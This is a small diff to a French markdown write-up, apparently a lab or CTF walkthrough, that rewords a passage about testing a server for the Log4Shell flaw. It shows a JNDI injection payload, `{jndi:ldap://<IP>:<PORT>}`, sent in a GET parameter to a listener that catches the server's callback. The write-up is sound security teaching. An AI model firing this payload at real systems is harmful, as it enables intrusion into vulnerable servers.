@@ -36,9 +36,8 @@ Pour identifier la vulnérabilité du système, j'injecte un paramètres GET ave
 
 `{jndi:ldap://<IP>:<PORT>}`
 
-Voilà donc l'injection, avec un listener de l'autre côté pour vérifier la bonne execution par le système de logs :
-
 ![5](https://user-images.githubusercontent.com/16634117/145870531-750a9523-9d1c-4b0d-b523-af4b2d1e669e.png)
+_L'injection, avec un listener pour récupérer la connexion, permettant de vérifier la bonne exécution de la charge utile_
 
 Une connexion s'effectue bien entre notre machine et le serveur, ce dernier est donc **vulnérable à l'attaque**.
 
